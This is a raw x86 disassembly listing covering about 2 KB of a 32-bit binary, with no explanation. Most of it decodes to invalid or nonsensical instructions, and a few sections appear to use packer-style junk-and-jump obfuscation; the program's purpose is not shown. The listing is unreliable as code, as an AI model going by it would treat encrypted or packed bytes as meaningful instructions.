  4062c9:	sbb    eax,0xc1c94637
  4062ce:	mov    ds,WORD PTR [edi+0x6b]
  4062d1:	leave  
  4062d2:	fwait
  4062d3:	aaa    
  4062d4:	cmp    BYTE PTR [ecx],dh
  4062d6:	jecxz  0x406345
  4062d8:	cdq    
  4062d9:	and    ebx,esp
  4062db:	sub    BYTE PTR [ebx+ecx*2],bl
  4062de:	retf   
  4062df:	out    dx,eax
  4062e0:	and    al,BYTE PTR [ecx-0x27]
  4062e3:	loope  0x406341
  4062e5:	(bad)  
  4062e6:	idiv   DWORD PTR [esi+0x6a]
  4062e9:	icebp  
  4062ea:	mov    WORD PTR [eax-0x2ba1224b],cs
  4062f0:	pop    ebx
  4062f1:	inc    edx
  4062f2:	pop    esp
  4062f3:	cmp    esp,ebx
  4062f5:	push   esi
  4062f6:	add    DWORD PTR [ebx-0x1c],edx
  4062f9:	scas   eax,DWORD PTR es:[edi]
  4062fa:	push   ecx
  4062fb:	inc    edx
  4062fc:	mov    DWORD PTR [esi-0x58],ebx
  4062ff:	sub    DWORD PTR [ecx],0x762e2df6
  406305:	jnp    0x406341
  406307:	enter  0x894d,0x5f
  40630b:	push   esp
  40630c:	xchg   ah,al
  40630e:	cmp    ecx,ecx
  406310:	into   
  406311:	sbb    edx,esp
  406313:	mov    dl,0x2b
  406315:	rol    cl,1
  406317:	jmp    0x40630a
  406319:	scas   eax,DWORD PTR es:[edi]
  40631a:	jmp    0x3044:0x873a19c5
  406321:	pushf  
  406322:	mov    al,0x43
  406324:	sub    esi,ebx
  406326:	sbb    eax,0x23b8735c
  40632b:	scas   al,BYTE PTR es:[edi]
  40632c:	adc    al,0x7f
  40632e:	jle    0x406348
  406330:	pusha  
  406331:	cmp    eax,0xe5be1ca2
  406336:	daa    
  406337:	sbb    BYTE PTR [ebp+0x63dff07d],ah
  40633d:	shr    DWORD PTR [ebp+ebx*1+0x4f9d1829],1
  406344:	es enter 0x8fb3,0xc2
  406349:	(bad)  
  40634a:	jge    0x4063bc
  40634c:	xchg   ebx,eax
  40634d:	push   esi
  40634e:	pop    ds
  40634f:	and    eax,0x937576d5
  406354:	inc    eax
  406355:	mov    ?,WORD PTR [esi+0x454eade9]
  40635b:	inc    eax
  40635c:	mov    BYTE PTR [edi-0x33],bl
  40635f:	mul    DWORD PTR [ebp+0x1f]
  406362:	sbb    al,0x5e
  406364:	sub    dl,bh
  406366:	jo     0x406357
  406368:	cmp    DWORD PTR [esi],esi
  40636a:	aad    0x5c
  40636c:	mov    cl,0x22
  40636e:	test   al,0x45
  406370:	and    bl,cl
  406372:	retf   
  406373:	pop    esp
  406374:	adc    al,0x4d
  406376:	shl    esp,0x6a
  406379:	cwde   
  40637a:	arpl   WORD PTR [esi+0x69],sp
  40637d:	mov    ch,BYTE PTR [edi]
  40637f:	dec    esp
  406380:	sbb    DWORD PTR [ebx-0x5aee2dd6],ebp
  406386:	mov    al,ch
  406388:	scas   al,BYTE PTR es:[edi]
  406389:	dec    eax
  40638a:	(bad)  
  40638b:	sahf   
  40638c:	add    DWORD PTR [esi-0x724ce29e],esi
  406392:	ret    0x4487
  406395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406396:	push   eax
  406397:	mov    ch,0x14
  406399:	std    
  40639a:	shl    DWORD PTR [ecx-0x5b21e90b],cl
  4063a0:	fcom   QWORD PTR [edi+0x6b40f952]
  4063a6:	fnstenv [edx-0x27]
  4063a9:	repnz cmp ebp,DWORD PTR [esi+0x311f2abc]
  4063b0:	sub    dl,BYTE PTR [ebp+0x76]
  4063b3:	push   ss
  4063b4:	adc    eax,0x60eae0b1
  4063b9:	test   DWORD PTR [esi],edx
  4063bb:	jmp    0x3e3:0x964faeb0
  4063c2:	dec    ecx
  4063c3:	pop    ss
  4063c4:	dec    ebx
  4063c5:	mov    eax,ds:0xeb0b3ce9
  4063ca:	pushf  
  4063cb:	lahf   
  4063cc:	pop    edi
  4063cd:	mov    edi,0xb1901834
  4063d2:	dec    edi
  4063d3:	and    DWORD PTR [edi],esp
  4063d5:	push   ecx
  4063d6:	mov    ch,0x46
  4063d8:	pop    ecx
  4063d9:	jle    0x406440
  4063db:	out    0x5,al
  4063dd:	(bad)  
  4063de:	xchg   edx,eax
  4063df:	jmp    0x40636a
  4063e1:	(bad)  
  4063e2:	jne    0x406403
  4063e4:	inc    ecx
  4063e5:	fiadd  DWORD PTR [edx-0x634d292c]
  4063eb:	adc    al,0xaa
  4063ed:	enter  0x3fe8,0xd7
  4063f1:	imul   bh
  4063f3:	pop    es
  4063f4:	outs   dx,DWORD PTR ds:[esi]
  4063f5:	mov    ds:0x275776fe,eax
  4063fa:	jae    0x40638b
  4063fc:	dec    eax
  4063fd:	inc    ecx
  4063fe:	xor    al,0x93
  406400:	scas   eax,DWORD PTR es:[edi]
  406401:	inc    edi
  406402:	xchg   edx,eax
  406403:	sub    cl,BYTE PTR [ebx]
  406405:	or     eax,0xa57a99e4
  40640a:	sub    BYTE PTR [edi+0x5ffb59e8],ah
  406410:	mov    ds:0xc47eefbd,al
  406415:	dec    esi
  406416:	sub    BYTE PTR [ecx-0x7efd153f],0xea
  40641d:	mov    DWORD PTR [ebp+0x0],edx
  406420:	add    BYTE PTR [ecx+0x1509e44d],cl
  406426:	scas   al,BYTE PTR es:[edi]
  406427:	sub    DWORD PTR [edx+0x0],eax
  40642a:	mov    ecx,DWORD PTR [ebx]
  40642c:	and    DWORD PTR ds:0x4228fe,edi
  406432:	mov    edx,DWORD PTR [ebx+0x4]
  406435:	xor    DWORD PTR [ebp-0x1c],edi
  406438:	or     DWORD PTR ds:0x4228ee,0x53f5
  406442:	xor    edx,edx
  406444:	jmp    0x4069ce
  406449:	fisttp DWORD PTR [ecx+0x7b]
  40644c:	mov    WORD PTR [ecx],ds
  40644e:	xor    al,0xe0
  406450:	sbb    BYTE PTR [ebp-0x6e9165b5],bl
  406456:	xor    ecx,0xffffffb4
  406459:	adc    DWORD PTR gs:[esi],0x16
  40645d:	cmp    eax,0xf1161604
  406462:	or     eax,eax
  406464:	in     eax,0x40
  406466:	push   ebp
  406467:	test   eax,0x8ff2b4dd
  40646c:	fcmovnb st,st(6)
  40646e:	push   ecx
  40646f:	dec    edx
  406470:	mov    ds:0x9389a0db,al
  406475:	cld    
  406476:	pop    eax
  406477:	pop    ebx
  406478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406479:	jnp    0x4064c0
  40647b:	pop    es
  40647c:	popf   
  40647d:	jnp    0x4064ba
  40647f:	adc    BYTE PTR [edi],0xf2
  406482:	icebp  
  406483:	mov    BYTE PTR [ebp-0x32],cl
  406486:	(bad)  
  406487:	lock mov ecx,edx
  40648a:	cmp    eax,0xb6eed3bf
  40648f:	mov    WORD PTR [ebx+0x6e8cdeb],?
  406495:	inc    ebx
  406496:	or     BYTE PTR [bx+si-0x1341],dl
  40649b:	pop    ecx
  40649c:	outs   dx,DWORD PTR ds:[esi]
  40649d:	aad    0xe4
  40649f:	push   es
  4064a0:	mov    bh,0xd1
  4064a2:	push   edi
  4064a3:	test   DWORD PTR [eax+0x2a04f91],ecx
  4064a9:	sahf   
  4064aa:	jle    0x40644c
  4064ac:	xchg   ecx,eax
  4064ad:	mov    esi,0x75029340
  4064b2:	xchg   ebx,eax
  4064b3:	sar    DWORD PTR [edi],1
  4064b5:	dec    edx
  4064b6:	test   BYTE PTR [eax-0x5a],0xd0
  4064ba:	fild   QWORD PTR [edx+0x180ee593]
  4064c0:	scas   al,BYTE PTR es:[edi]
  4064c1:	pop    ds
  4064c2:	call   0xa61e:0xa85c3772
  4064c9:	sbb    eax,DWORD PTR [edx+eax*1]
  4064cc:	sbb    al,0x65
  4064ce:	jle    0x4064f3
  4064d0:	push   ds
  4064d1:	or     al,0xa
  4064d3:	test   eax,0x5f5e4c3b
  4064d8:	jb     0x4064a1
  4064da:	in     eax,dx
  4064db:	fstp   TBYTE PTR [ecx+0x50b995d4]
  4064e1:	adc    ecx,DWORD PTR [ebx-0x62c40d9e]
  4064e7:	inc    eax
  4064e8:	das    
  4064e9:	lock mov bl,0x59
  4064ec:	shl    BYTE PTR [ecx+0x6e],cl
  4064ef:	ins    BYTE PTR es:[edi],dx
  4064f0:	ins    DWORD PTR es:[edi],dx
  4064f1:	push   0xffffffda
  4064f3:	and    dl,BYTE PTR [esi-0x57]
  4064f6:	lea    edi,[edi+0x55f818c4]
  4064fc:	(bad)  
  4064fd:	pusha  
  4064fe:	mov    al,0xcb
  406500:	pop    eax
  406501:	std    
  406502:	xor    al,ah
  406504:	cdq    
  406505:	out    0x74,al
  406507:	mov    ?,WORD PTR [ecx+0xd]
  40650a:	sub    ah,BYTE PTR ss:[ebx+0x995e0e3]
  406511:	pop    ebx
  406512:	mov    dh,0xf7
  406514:	pop    ecx
  406515:	cwde   
  406516:	aaa    
  406517:	jbe    0x406532
  406519:	aam    0x37
  40651b:	outs   dx,DWORD PTR ds:[esi]
  40651c:	mov    dh,ch
  40651e:	sub    eax,0x6fe0c8fc
  406523:	in     eax,0x61
  406525:	sbb    DWORD PTR [edi-0x23395da7],ebp
  40652b:	repnz aam 0xfa
  40652e:	mov    DWORD PTR [eax],ecx
  406530:	dec    edi
  406531:	imul   edx,DWORD PTR ds:0x11de7970,0xd6a6fbd7
  40653b:	ret    
  40653c:	scas   eax,DWORD PTR es:[edi]
  40653d:	mov    ah,0x83
  40653f:	push   es
  406540:	mov    ds:0xd2e56a7b,eax
  406545:	add    esp,eax
  406547:	cmp    eax,0x23edb98c
  40654c:	sbb    al,BYTE PTR [ebp-0x779603f5]
  406552:	jg     0x40659a
  406554:	fs mov bl,0xe2
  406557:	push   esp
  406558:	test   eax,0x14a88f2a
  40655d:	fnstsw WORD PTR [ebx]
  40655f:	imul   edi,DWORD PTR [edi-0x127442d1],0x5297329b
  406569:	xor    DWORD PTR [eax+ebx*2+0x7dda428c],edx
  406570:	mov    WORD PTR ds:[eax-0xd9fbee6],?
  406577:	xchg   ebp,eax
  406578:	inc    eax
  406579:	lock push ecx
  40657b:	xchg   ebp,eax
  40657d:	mov    bh,BYTE PTR [eax]
  40657f:	sub    BYTE PTR [esi+ecx*8-0xa40937],dh
  406586:	mov    BYTE PTR [esi+ebx*2+0x3c5669],ah
  40658d:	inc    edi
  40658e:	cdq    
  40658f:	mov    ds:0xb79e0438,al
  406594:	mov    ah,BYTE PTR [edx+eiz*8+0x50]
  406598:	icebp  
  406599:	jne    0x406608
  40659b:	and    eax,0x95055b5c
  4065a0:	aas    
  4065a1:	cmp    cl,ch
  4065a3:	into   
  4065a4:	cli    
  4065a5:	daa    
  4065a6:	(bad)
  4065aa:	fisub  WORD PTR [edx]
  4065ac:	cmp    eax,ebp
  4065ae:	xor    edx,esi
  4065b0:	outs   dx,DWORD PTR ds:[esi]
  4065b1:	dec    esi
  4065b2:	sub    esi,DWORD PTR [edi-0x30296fd6]
  4065b8:	dec    ecx
  4065b9:	stos   DWORD PTR es:[edi],eax
  4065ba:	push   ebp
  4065bb:	nop
  4065bc:	ret    
  4065bd:	sbb    cl,BYTE PTR [esi]
  4065bf:	clc    
  4065c0:	dec    ecx
  4065c1:	out    dx,al
  4065c2:	mov    esp,0x7b5b8517
  4065c7:	aad    0xb2
  4065c9:	sub    al,0xd2
  4065cb:	mov    bl,0x92
  4065cd:	cs in  eax,0x61
  4065d0:	sti    
  4065d1:	mov    al,ds:0x1ee69e11
  4065d6:	adc    BYTE PTR [ebp+0x29ca71c9],dh
  4065dc:	hlt    
  4065dd:	adc    esp,esi
  4065df:	jmp    0xb836:0x429ed8bd
  4065e6:	repz dec esp
  4065e8:	loop   0x40663e
  4065ea:	jmp    edx
  4065ec:	xchg   ebp,eax
  4065ed:	pop    ebp
  4065ee:	adc    DWORD PTR [ebp-0x6da59b40],esp
  4065f4:	adc    eax,0x2f82305e
  4065f9:	mov    edx,0xf3177c2
  4065fe:	dec    edx
  4065ff:	jg     0x40663d
  406601:	ficom  DWORD PTR [ecx+edi*4-0x26]
  406605:	out    dx,eax
  406606:	mov    ds:0xfab36208,al
  40660b:	mov    bl,BYTE PTR [esi+0x50c63e13]
  406611:	sbb    DWORD PTR [ebx+ecx*2],0x4d0b720e
  406618:	popa   
  406619:	xchg   edx,eax
  40661a:	mov    cl,0xbd
  40661c:	adc    bl,bh
  40661e:	mov    WORD PTR [edi],es
  406620:	add    eax,0x7ee21cff
  406625:	daa    
  406626:	pop    ds
  406627:	xchg   eax,ebx
  406629:	in     eax,dx
  40662a:	test   eax,0x9be09868
  40662f:	shr    DWORD PTR [ebx],cl
  406631:	dec    edi
  406632:	add    al,BYTE PTR [edx+0x30]
  406635:	lods   eax,DWORD PTR ds:[esi]
  406636:	xor    DWORD PTR [ecx],ebx
  406638:	adc    al,0xe8
  40663a:	stc    
  40663b:	sbb    esp,eax
  40663d:	cwde   
  40663e:	shl    esi,0x33
  406641:	add    ebx,ebp
  406643:	inc    edx
  406644:	and    eax,0x51c2a8cd
  406649:	inc    edi
  40664a:	stc    
  40664b:	push   ss
  40664c:	js     0x406671
  40664e:	test   ebp,ebx
  406650:	lods   eax,DWORD PTR ds:[esi]
  406651:	or     BYTE PTR [esi-0x36014ed1],ah
  406657:	add    eax,0x465b4fba
  40665c:	sar    DWORD PTR [ebp+0x39],cl
  40665f:	sub    DWORD PTR ds:0xdf538ed8,edi
  406665:	test   BYTE PTR [esi-0x1ea4efed],al
  40666b:	outs   dx,BYTE PTR ds:[esi]
  40666c:	mov    esp,0xbec55b65
  406671:	jl     0x406631
  406673:	adc    BYTE PTR [edi],bl
  406675:	mov    edi,0x532022
  40667a:	cmp    ecx,DWORD PTR [esi]
  40667c:	push   ebp
  40667d:	xchg   BYTE PTR [edx],cl
  40667f:	inc    esp
  406680:	mov    bh,0xcc
  406682:	pop    edi
  406683:	lods   eax,DWORD PTR ds:[esi]
  406684:	rol    DWORD PTR [edi+0x7b],1
  406687:	shl    BYTE PTR ds:0xebb69fe7,cl
  40668d:	xor    DWORD PTR [esi+0x38],eax
  406690:	pop    esi
  406691:	es mov ecx,?
  406694:	jne    0x4066cc
  406696:	add    eax,0x58750133
  40669b:	jno    0x4066cb
  40669d:	(bad)  
  40669e:	stos   DWORD PTR es:[edi],eax
  40669f:	(bad)  
  4066a0:	jmp    0x406639
  4066a2:	repnz shl BYTE PTR [edi+0x37],1
  4066a6:	lock adc dl,ah
  4066a9:	xchg   esp,eax
  4066aa:	sbb    BYTE PTR [eax],dl
  4066ac:	push   esp
  4066ad:	or     al,0xb2
  4066af:	cli    
  4066b0:	enter  0x6b5a,0xae
  4066b4:	aam    0xb2
  4066b6:	scas   al,BYTE PTR es:[edi]
  4066b7:	push   ds
  4066b8:	sub    eax,0xed4b0540
  4066bd:	jb     0x406697
  4066bf:	sbb    esi,edx
  4066c1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066c3:	xor    DWORD PTR gs:[ecx+eiz*8],eax
  4066c7:	cli    
  4066c8:	mov    ebx,0x83c0fa24
  4066cd:	je     0x4066b4
  4066cf:	(bad)  
  4066d0:	cs mov ebp,cr0
  4066d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066d5:	ds mov cl,0x4d
  4066d8:	dec    edi
  4066d9:	test   BYTE PTR [ecx+0x42],dh
  4066dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066dd:	test   BYTE PTR [ebp-0x1c],dh
  4066e0:	(bad)  
  4066e1:	mov    eax,DWORD PTR [ecx+0x1732a5b1]
  4066e7:	mov    dl,0xe9
  4066e9:	push   edx
  4066ea:	or     cl,ah
  4066ec:	adc    al,0x1d
  4066ee:	dec    esi
  4066ef:	mov    ds:0xcbedcdb0,al
  4066f4:	mov    BYTE PTR [ebx],cl
  4066f6:	bound  edx,QWORD PTR [ebx-0x4b62f65f]
  4066fc:	je     0x40671b
  4066fe:	fdivr  QWORD PTR [ebx]
  406700:	mov    al,ds:0x67a4cd94
  406705:	scas   al,BYTE PTR es:[edi]
  406706:	cwde   
  406707:	xchg   edi,eax
  406708:	hlt    
  406709:	dec    ebx
  40670a:	addr16 in al,dx
  40670c:	or     eax,DWORD PTR [edx+0x20]
  40670f:	test   DWORD PTR [ebx+0x6ef9f7ee],esp
  406715:	adc    BYTE PTR [ecx+0x196bdc18],ah
  40671b:	mov    ds:0x960ae50b,eax
  406720:	les    ecx,FWORD PTR [ebx+0xa5b062]
  406726:	push   ecx
  406727:	mov    dx,0x4d0d
  40672b:	push   ecx
  40672c:	mov    edx,0xaaa62569
  406731:	sub    edx,DWORD PTR [edi]
  406733:	jg     0x406776
  406735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406736:	jmp    0xa159:0xe9bf3b5a
  40673d:	or     eax,DWORD PTR ds:0x2e5bb436
  406743:	cmc    
  406744:	mov    edx,0xe644c743
  406749:	mov    ds:0x1d6cb49,al
  40674e:	add    esi,DWORD PTR [eax+0x45038f55]
  406754:	enter  0x2fac,0xb2
  406758:	adc    al,0xec
  40675a:	nop
  40675b:	arpl   WORD PTR [ecx+eax*2-0x3d364b17],ax
  406762:	mov    bh,0xed
  406764:	test   eax,0x5a078e0f
  406769:	xor    DWORD PTR [edx],eax
  40676b:	rol    dh,1
  40676d:	hlt    
  40676e:	lds    edi,FWORD PTR [edi+0x315bec2d]
  406774:	cmp    dh,0xa9
  406777:	out    dx,eax
  406778:	add    al,0x2a
  40677a:	mov    dh,0xe1
  40677c:	and    DWORD PTR [edx+ecx*2+0x35],edx
  406780:	push   ds
  406781:	inc    eax
  406782:	imul   edi,DWORD PTR [esp+edx*8-0x7890a5cd],0x399647db
  40678d:	ficom  WORD PTR [ecx-0x5c]
  406790:	xchg   edi,eax
  406791:	dec    esi
  406792:	sbb    eax,0x7161cdd5
  406797:	arpl   WORD PTR [edx-0x5d],si
  40679a:	pop    ecx
  40679b:	mov    cl,0x9f
  40679d:	add    ecx,eax
  40679f:	add    bh,BYTE PTR [eax+ecx*2]
  4067a2:	xchg   esp,eax
  4067a3:	mov    ah,0xa8
  4067a5:	cld    
  4067a6:	cmp    ah,BYTE PTR [esi+ecx*4-0x2c]
  4067aa:	xor    al,0xeb
  4067ac:	cld    
  4067ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067ae:	mov    bh,0x7
  4067b0:	inc    esi
  4067b1:	ret    0xffd4
  4067b4:	xor    eax,0xbacc7a9d
  4067b9:	int3   
  4067ba:	cwde   
  4067bb:	mov    fs,WORD PTR [ecx]
  4067bd:	leave  
  4067be:	jno    0x406836
  4067c0:	shl    DWORD PTR [eax-0x51bad4a6],0x1f
  4067c7:	cdq    
  4067c8:	pop    esi
  4067c9:	xchg   esi,eax
  4067ca:	jb     0x4067d4
  4067cc:	aaa    
  4067cd:	not    BYTE PTR [bx+si]
  4067d0:	lods   eax,DWORD PTR ds:[esi]
  4067d1:	cmp    eax,0x5c51392e
  4067d6:	ja     0x4067d5
  4067d8:	stos   DWORD PTR es:[edi],eax
  4067d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067da:	out    0x0,eax
  4067dc:	sbb    DWORD PTR fs:[ebx],ecx
  4067df:	pop    es
  4067e0:	mov    esi,DWORD PTR [ebx]
  4067e2:	mov    al,ds:0xcbc83310
  4067e7:	mov    ds:0x9eb06d15,eax
  4067ec:	dec    eax
  4067ed:	std    
  4067ee:	mov    esi,0x9bb8cbbb
  4067f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067f4:	sbb    dh,BYTE PTR [ebp-0x5d]
  4067f7:	push   ss
  4067f8:	fs out 0x51,eax
  4067fb:	shl    DWORD PTR [esi+0x72],0x2f
  4067ff:	mov    ebx,0x4d0f23d
  406804:	mov    edi,0xc3b46d99
  406809:	jmp    0x4758:0x6114ed9f
  406810:	test   BYTE PTR [ebp+0x0],bl
  406813:	inc    ebp
  406814:	xor    eax,0x6f465744
  406819:	xchg   ebx,eax
  40681a:	xor    bh,cl
  40681c:	pushf  
  40681d:	cld    
  40681e:	and    ch,BYTE PTR [edi-0x5e]
  406821:	sub    DWORD PTR [esi+0x3367aa26],ebp
  406827:	ins    BYTE PTR es:[edi],dx
  406828:	and    ah,cl
  40682a:	out    0x4d,al
  40682c:	ror    DWORD PTR [ebp+0x3ec2a4d3],0xe6
  406833:	fldcw  WORD PTR [ebp+0x8f895b6]
  406839:	stos   DWORD PTR es:[edi],eax
  40683a:	fild   WORD PTR cs:[ebx-0x51]
  40683e:	pop    ecx
  40683f:	pop    edx
  406840:	pop    ecx
  406841:	into   
  406842:	ds dec ecx
  406844:	sbb    bh,BYTE PTR [ebx-0x78]
  406847:	(bad)  
  406848:	push   cs
  406849:	jl     0x406837
  40684b:	xor    esp,DWORD PTR [ebx]
  40684d:	ds icebp 
  40684f:	imul   edi
  406851:	or     eax,0xb637c689
  406856:	(bad)
  406859:	inc    edx
  40685a:	push   edi
  40685b:	mul    DWORD PTR [ecx-0x5c]
  40685e:	push   eax
  40685f:	dec    ecx
  406860:	scas   al,BYTE PTR es:[edi]
  406861:	mov    esi,0x30be4c63
  406866:	mov    BYTE PTR [ecx-0x5b8257c8],dh
  40686c:	cmp    eax,0x811fe087
  406871:	ret    0xc2b3
  406874:	sub    DWORD PTR [ecx+0x4ad0bbe],edx
  40687a:	mov    edx,0x3d6a3e82
  40687f:	dec    edi
  406880:	sub    eax,0x360358b
  406885:	xor    al,0x87
  406887:	sbb    ch,bl
  406889:	adc    BYTE PTR [eax+0x7b],0xbc
  40688d:	retf   
  40688e:	push   ebp
  40688f:	cmp    cl,BYTE PTR ds:0xf94ca9fb
  406895:	jmp    0x1a67782c
  40689a:	mov    esi,0x6521053a
  40689f:	add    eax,0x4abc8813
  4068a4:	sbb    DWORD PTR ds:0xcfb1f98f,ecx
  4068aa:	jae    0x40685b
  4068ac:	ret    
  4068ad:	push   ss
  4068ae:	mov    WORD PTR [ecx+0x499aa410],?
  4068b4:	push   es
  4068b5:	pop    ebp
  4068b6:	dec    eax
  4068b7:	dec    esi
  4068b8:	add    dh,ah
  4068ba:	(bad)  
  4068bb:	sbb    DWORD PTR [edx-0x20],ebx
  4068be:	jle    0x40688c
  4068c0:	popf   
  4068c1:	sbb    eax,0xdb58f554
  4068c6:	lock stos DWORD PTR es:[edi],eax
  4068c8:	and    al,0x6b
  4068ca:	in     al,dx
  4068cb:	xchg   DWORD PTR [ebx+0x4b],edx
  4068ce:	outs   dx,DWORD PTR ds:[esi]
  4068cf:	dec    ebp
  4068d0:	inc    ecx
  4068d1:	ret    
  4068d2:	cmp    edx,DWORD PTR [ebp+0x58]
  4068d5:	ins    BYTE PTR es:[edi],dx
  4068d6:	call   0xf351cded
  4068db:	cdq    
  4068dc:	es jb  0x4068a5
  4068df:	jg     0x4068a3
  4068e1:	pop    esp
  4068e2:	and    ebp,DWORD PTR [edi-0x4d]
  4068e5:	fs pop ds
  4068e7:	sbb    ebp,esp
  4068e9:	test   eax,0x3be6779
  4068ee:	ja     0x406908
  4068f0:	mov    ch,BYTE PTR [eax+0x1aacc4b4]
  4068f6:	inc    esp
  4068f7:	test   BYTE PTR [edx-0x2c],cl
  4068fa:	(bad)  
  4068fb:	hlt    
  4068fc:	jp     0x406964
  4068fe:	enter  0x33f4,0xe3
  406902:	(bad)  
  406903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406904:	dec    ebx
  406905:	mov    al,0x7a
  406907:	dec    ebx
  406908:	leave  
  406909:	fstp   QWORD PTR [edx+0x436803f4]
  40690f:	jae    0x406988
  406911:	ror    DWORD PTR ss:[esi+0x35],1
  406915:	adc    cl,0xd2
  406918:	loopne 0x4068a7
  40691a:	jp     0x4068f6
  40691c:	dec    ebx
  40691d:	in     al,0xf4
  40691f:	arpl   WORD PTR [edi],ax
  406921:	jge    0x4068ef
  406923:	jl     0x4068a9
  406925:	aas    
  406926:	into   
  406927:	push   ds
  406928:	mul    BYTE PTR [ebp+0x7e30cacb]
  40692e:	test   BYTE PTR [ecx-0x58],bl
  406931:	stc    
  406932:	sbb    BYTE PTR [esi+0x78],ah
  406935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406936:	(bad)  
  406937:	bound  ebx,QWORD PTR [ebx-0x749539bb]
  40693d:	mov    DWORD PTR [edx],ebx
  40693f:	nop
  406940:	mov    cl,0x84
  406942:	cmp    bl,BYTE PTR [ecx-0x6ce2b726]
  406948:	int    0xa8
  40694a:	and    ebx,DWORD PTR [edi+0x7a]
  40694d:	push   ds
  40694e:	xor    eax,0xabb01b00
  406953:	rcr    bl,0x44
  406956:	daa    
  406957:	push   ebp
  406958:	sahf   
  406959:	clc    
  40695a:	std    
  40695b:	jne    0x4068e6
  40695d:	mov    eax,ds:0xf09ef877
  406962:	pop    es
  406963:	jecxz  0x406972
  406965:	stos   BYTE PTR es:[edi],al
  406966:	jp     0x406968
  406968:	ss stos BYTE PTR es:[edi],al
  40696a:	fld    QWORD PTR [esp+ebp*8+0x23]
  40696e:	xor    DWORD PTR [eax-0x71],ecx
  406971:	pop    ss
  406972:	in     al,0x74
  406974:	aas    
  406975:	jl     0x40694d
  406977:	push   ds
  406978:	imul   ebx,DWORD PTR [ecx],0x40fc15ce
  40697e:	aad    0xa4
  406980:	xor    BYTE PTR [ebx+0x7d],bh
  406983:	xlat   BYTE PTR ds:[ebx]
  406984:	mov    esp,0x45a37241
  406989:	data16 or bl,cl
  40698c:	and    dl,BYTE PTR [ecx+0x75fc3aa8]
  406992:	and    al,0x75
  406994:	popa   
  406995:	aas    
  406996:	mov    DWORD PTR [eax],esi
  406998:	add    cl,ch
  40699a:	and    al,cl
  40699c:	sar    ch,0xae
  40699f:	mov    ecx,0xd6ff9e0e
  4069a4:	add    DWORD PTR [eax+0x2c],ecx
  4069a7:	sbb    DWORD PTR [ebp+eiz*1+0x17297e6c],ecx
  4069ae:	mov    ebx,DWORD PTR ss:[ecx]
  4069b1:	enter  0xb66d,0x1e
  4069b5:	sbb    al,0x2e
  4069b7:	or     BYTE PTR [esi+esi*8],al
  4069ba:	(bad)  
  4069bb:	cld    
  4069bc:	imul   esp,DWORD PTR ds:0x5c1cf154,0xc6520a99
  4069c6:	sbb    DWORD PTR [esi+0x72],ebx
  4069c9:	jp     0x406978
  4069cb:	into   
  4069cc:	xor    DWORD PTR ds:0xc1e4550b,edi
  4069d2:	loope  0x4069f2
  4069d4:	sub    DWORD PTR ds:0x4228b2,0x1171
  4069de:	imul   edx,DWORD PTR [ebp-0x2c]
  4069e2:	sub    DWORD PTR [eax],edx
  4069e4:	mov    DWORD PTR ds:0x4228ae,0x6b62
  4069ee:	jmp    0x4076e1
  4069f3:	sub    edx,ecx
  4069f5:	mov    ecx,DWORD PTR [esi]
  4069f7:	mov    edx,DWORD PTR [esi+0x4]
  4069fa:	sbb    DWORD PTR ds:0x42293a,0x607d
  406a04:	shrd   ecx,edx,0x2
  406a08:	mov    DWORD PTR [ebp-0x1c],ecx
  406a0b:	mov    ecx,DWORD PTR [esi]
  406a0d:	xor    DWORD PTR [ebp-0x1c],edi
  406a10:	adc    DWORD PTR ds:0x42288e,0x77db
  406a1a:	jmp    0x406fa4
  406a1f:	bound  ebx,QWORD PTR [ecx-0xe]
  406a22:	imul   edi,ecx,0x71
  406a25:	push   edx
  406a26:	pop    eax
  406a27:	fst    DWORD PTR [eax]
  406a29:	std    
  406a2a:	mov    ah,0x10
  406a2c:	enter  0xb284,0x92
  406a30:	adc    DWORD PTR [esi],0x16043d16
  406a36:	push   ss
  406a37:	icebp  
  406a38:	or     dh,BYTE PTR [esi]
  406a3a:	out    0x11,eax
  406a3c:	jecxz  0x406a99
  406a3e:	cli    
  406a3f:	ds out dx,eax
  406a41:	cmp    bh,BYTE PTR [ebx]
  406a43:	ret    0x5b92
  406a46:	xor    eax,0xb81e22d1
  406a4b:	(bad)  
  406a4c:	inc    ebp
  406a4d:	push   ds
  406a4e:	add    eax,0xc7885cbd
  406a53:	pusha  
  406a54:	mov    ds:0x6610c99f,al
  406a59:	sar    ch,0xbd
  406a5c:	inc    eax
  406a5d:	loopne 0x406a55
  406a5f:	clc    
  406a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a61:	pop    esi
  406a62:	cmc    
  406a63:	adc    ah,0xde
  406a66:	(bad)  
  406a67:	push   0x25159c3e
  406a6c:	adc    BYTE PTR [edx],bh
  406a6e:	stos   BYTE PTR es:[edi],al
  406a6f:	push   ds
  406a70:	popf   
  406a71:	out    0xaa,eax
  406a73:	in     eax,dx
  406a74:	xor    eax,0x3cc8b23a
  406a79:	(bad)  
  406a7a:	mov    WORD PTR [eax],ds
  406a7c:	xchg   edx,eax
  406a7d:	push   cs
  406a7e:	add    BYTE PTR [esp+eax*8-0x39],al
  406a82:	sbb    ah,BYTE PTR [esi+0x22]
  406a85:	cld    
  406a86:	test   eax,0x20bdc705
  406a8b:	sbb    edx,ebx
  406a8d:	inc    esi
  406a8e:	js     0x406aa7
  406a90:	pop    es
  406a91:	stc    
  406a92:	adc    DWORD PTR [edx],edx
  406a94:	mov    edx,0x54bc7af3
  406a99:	push   ebp
  406a9a:	cmp    bl,BYTE PTR ds:0xb3d1c84
  406aa0:	sub    BYTE PTR [edx-0x54],bl
  406aa3:	push   eax
  406aa4:	jmp    DWORD PTR [ebx+edi*4]
  406aa7:	mov    ah,0x21
  406aa9:	int    0x87
  406aab:	mov    esi,0xed8eb9d7
  406ab0:	lea    ebp,[edi-0x4c06cf9b]
  406ab6:	cmp    ebx,DWORD PTR [esi]
  406ab8:	sar    dl,cl
  406aba:	sbb    al,0xf7
  406abc:	sbb    dl,al
